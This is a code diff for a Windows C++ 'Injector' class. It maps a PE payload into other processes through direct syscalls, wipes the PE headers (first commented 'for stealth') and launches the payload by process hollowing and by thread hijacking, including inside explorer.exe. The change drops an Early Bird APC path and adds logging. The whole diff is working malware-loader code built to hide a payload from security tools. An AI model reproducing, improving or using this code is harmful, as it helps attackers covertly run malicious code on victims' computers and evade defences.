@@ -35,6 +35,7 @@ bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload
         LOG_ERR("MapAndInject: NtAllocateVirtualMemory fail. Status: " + utils::Shared::ToHex(status));
         return false;
     }
+    LOG_INFO("MapAndInject: Allocated at " + utils::Shared::ToHex((DWORD64)pTargetBase));
 
     // 2. Map & Reloc locally
     std::vector<uint8_t> localMapping(pNtHeaders->OptionalHeader.SizeOfImage);
@@ -68,17 +69,17 @@ bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload
         }
     }
 
-    // 3. Write fixed image via syscall
+    // 3. Write via syscall
     if (!NT_SUCCESS(SysNtWriteVirtualMemory(hProcess, pTargetBase, pLocalBase, pNtHeaders->OptionalHeader.SizeOfImage, NULL))) {
         LOG_ERR("MapAndInject: NtWriteVirtualMemory fail.");
         return false;
     }
 
-    // 4. Wipe Headers for stealth
+    // 4. Wipe Headers
     std::vector<uint8_t> zeroHeader(pNtHeaders->OptionalHeader.SizeOfHeaders, 0);
     SysNtWriteVirtualMemory(hProcess, pTargetBase, zeroHeader.data(), zeroHeader.size(), NULL);
 
-    // 5. Change protection to RX via syscall
+    // 5. Change protection to RX
     DWORD oldProt;
     PVOID pProtBase = pTargetBase;
     SIZE_T protSize = pNtHeaders->OptionalHeader.SizeOfImage;
@@ -93,27 +94,33 @@ bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload
 
 bool Injector::HijackThread(HANDLE hThread, PVOID pEntryPoint) {
     CONTEXT ctx;
-    ctx.ContextFlags = CONTEXT_FULL;
+    ctx.ContextFlags = CONTEXT_CONTROL; // Only need control registers (RIP/EIP)
 
-    if (!NT_SUCCESS(SysNtSuspendThread(hThread, NULL))) return false;
+    if (!NT_SUCCESS(SysNtSuspendThread(hThread, NULL))) {
+        LOG_ERR("HijackThread: NtSuspendThread fail.");
+        return false;
+    }
 
     if (!NT_SUCCESS(SysNtGetContextThread(hThread, &ctx))) {
+        LOG_ERR("HijackThread: NtGetContextThread fail.");
         SysNtResumeThread(hThread, NULL);
         return false;
     }
 
 #ifdef _M_AMD64
+    LOG_INFO("HijackThread: RIP: " + utils::Shared::ToHex(ctx.Rip) + " -> " + utils::Shared::ToHex((DWORD64)pEntryPoint));
     ctx.Rip = (DWORD64)pEntryPoint;
 #else
+    LOG_INFO("HijackThread: EIP: " + utils::Shared::ToHex(ctx.Eip) + " -> " + utils::Shared::ToHex((DWORD)pEntryPoint));
     ctx.Eip = (DWORD)pEntryPoint;
 #endif
 
     if (!NT_SUCCESS(SysNtSetContextThread(hThread, &ctx))) {
+        LOG_ERR("HijackThread: NtSetContextThread fail.");
         SysNtResumeThread(hThread, NULL);
         return false;
     }
 
-    LOG_INFO("Thread hijacked successfully.");
     SysNtResumeThread(hThread, NULL);
     return true;
 }
@@ -121,38 +128,27 @@ bool Injector::HijackThread(HANDLE hThread, PVOID pEntryPoint) {
 bool Injector::HollowProcess(const std::wstring& targetPath, const std::vector<uint8_t>& payload) {
     STARTUPINFOW si; PROCESS_INFORMATION pi;
     RtlZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
-
     if (!CreateProcessW(NULL, (LPWSTR)targetPath.c_str(), NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-        LOG_ERR("HollowProcess: CreateProcessW fail. Error: " + std::to_string(GetLastError()));
+        LOG_ERR("HollowProcess: CreateProcess fail. Target: " + utils::ws2s(targetPath) + " Error: " + std::to_string(GetLastError()));
         return false;
     }
-
     PVOID pRemoteBase = NULL;
     if (!MapAndInject(pi.hProcess, payload, &pRemoteBase)) {
         TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return false;
     }
-
     PBYTE pSrcData = (PBYTE)payload.data();
     PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pSrcData;
     PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pSrcData + pDosHeader->e_lfanew);
     PVOID pEntryPoint = (PVOID)((PBYTE)pRemoteBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
 
-    // Try Early Bird APC
-    NTSTATUS status = SysNtQueueApcThreadEx(pi.hThread, NULL, pEntryPoint, NULL, NULL, NULL);
+    LOG_INFO("HollowProcess: EntryPoint at " + utils::Shared::ToHex((DWORD64)pEntryPoint));
 
-    if (NT_SUCCESS(status)) {
-        LOG_INFO("HollowProcess: Early Bird APC success.");
-        SysNtResumeThread(pi.hThread, NULL);
+    if (HijackThread(pi.hThread, pEntryPoint)) {
+         LOG_INFO("HollowProcess: Success.");
     } else {
-        LOG_WARN("HollowProcess: APC fail. Trying Thread Hijacking.");
-        if (HijackThread(pi.hThread, pEntryPoint)) {
-             LOG_INFO("HollowProcess: Hijack success.");
-        } else {
-             LOG_ERR("HollowProcess: Hijack fail.");
-             TerminateProcess(pi.hProcess, 0);
-        }
+         LOG_ERR("HollowProcess: Hijack fail.");
+         TerminateProcess(pi.hProcess, 0);
     }
-
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
     return true;
@@ -184,25 +180,17 @@ bool Injector::InjectIntoExplorer(const std::vector<uint8_t>& payload, const std
     if (pid == 0) return false;
 
     HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_SUSPEND_RESUME, FALSE, pid);
-    if (!hProcess) {
-        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    }
-
-    if (!hProcess) {
-        LOG_ERR("Inject: Open explorer fail. Error: " + std::to_string(GetLastError()));
-        return false;
-    }
+    if (!hProcess) hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProcess) return false;
 
     PVOID pRemoteBase = NULL;
     bool success = MapAndInject(hProcess, payload, &pRemoteBase);
-
     if (success) {
         PBYTE pSrcData = (PBYTE)payload.data();
         PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pSrcData;
         PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pSrcData + pDosHeader->e_lfanew);
         PVOID pEntryPoint = (PVOID)((PBYTE)pRemoteBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
 
-        // Try Hijacking a thread in explorer
         HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
         if (hSnap != INVALID_HANDLE_VALUE) {
             THREADENTRY32 te; te.dwSize = sizeof(te);
@@ -212,7 +200,7 @@ bool Injector::InjectIntoExplorer(const std::vector<uint8_t>& payload, const std
                         HANDLE hT = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                         if (hT) {
                             if (HijackThread(hT, pEntryPoint)) {
-                                LOG_INFO("InjectIntoExplorer: Hijack success on thread " + std::to_string(te.th32ThreadID));
+                                LOG_INFO("Inject: Hijack success on " + std::to_string(te.th32ThreadID));
                                 CloseHandle(hT); break;
                             }
                             CloseHandle(hT);
